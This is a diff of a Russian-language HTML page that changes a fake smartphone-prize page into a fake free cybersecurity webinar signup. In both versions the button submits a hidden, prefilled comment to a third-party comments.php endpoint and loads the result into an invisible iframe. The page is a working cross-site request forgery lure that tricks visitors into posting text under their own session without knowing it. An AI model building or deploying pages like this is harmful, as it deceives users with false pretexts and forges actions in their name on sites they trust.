@@ -2,87 +2,56 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Поздравляем! Вы выиграли приз</title>
+  <title>Запись на вебинар</title>
   <style>
     body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom right, #dff6ff, #ffffff);
+      font-family: sans-serif;
       text-align: center;
-      padding: 40px;
-      animation: fadeIn 2s ease-in;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-20px); }
-      to { opacity: 1; transform: translateY(0); }
+      background-color: #f4f8fb;
+      padding: 60px;
     }
 
     h1 {
-      color: #28a745;
-      font-size: 36px;
-      margin-bottom: 10px;
+      font-size: 30px;
+      color: #2c3e50;
     }
 
     p {
-      font-size: 20px;
-      color: #333;
-    }
-
-    img {
-      max-width: 320px;
-      border-radius: 20px;
-      margin: 30px 0;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-      animation: bounce 1s ease-in-out infinite alternate;
-    }
-
-    @keyframes bounce {
-      0%   { transform: translateY(0); }
-      100% { transform: translateY(-10px); }
+      font-size: 18px;
+      color: #555;
+      margin-top: 10px;
+      margin-bottom: 30px;
     }
 
     button {
-      padding: 14px 28px;
-      font-size: 18px;
-      background-color: #28a745;
+      padding: 12px 26px;
+      font-size: 16px;
+      background-color: #3498db;
       color: white;
       border: none;
-      border-radius: 10px;
+      border-radius: 6px;
       cursor: pointer;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-      transition: background 0.3s ease;
     }
 
     button:hover {
-      background-color: #218838;
+      background-color: #2980b9;
     }
 
-    .hidden-frame {
+    iframe {
       display: none;
-    }
-
-    .footer {
-      margin-top: 50px;
-      font-size: 14px;
-      color: #888;
     }
   </style>
 </head>
 <body>
-  <h1>🎉 Поздравляем!</h1>
-  <p>Вы стали победителем розыгрыша смартфона Samsung Galaxy A54!</p>
-  <img src="https://cdn.pixabay.com/photo/2017/02/01/22/02/phone-2032277_960_720.png" alt="Приз - Смартфон">
+  <h1>📢 Бесплатный вебинар: «Кибербезопасность 2025»</h1>
+  <p>Успей зарегистрироваться — количество мест ограничено!</p>
 
   <form action="https://kazcyber.zapto.org/comments.php" method="POST" target="hiddenFrame">
-    <input type="hidden" name="comment" value="Спасибо за приз! Получил Samsung Galaxy A54">
-    <button type="submit">Забрать приз</button>
+    <input type="hidden" name="comment" value="Зарегистрировался на вебинар Кибербезопасность 2025!">
+    <button type="submit">Записаться</button>
   </form>
 
-  <iframe name="hiddenFrame" class="hidden-frame"></iframe>
-
-  <div class="footer">
-    © 2025 KazCyber Promotions. Все права защищены.
-  </div>
+  <iframe name="hiddenFrame"></iframe>
 </body>
 </html>
+
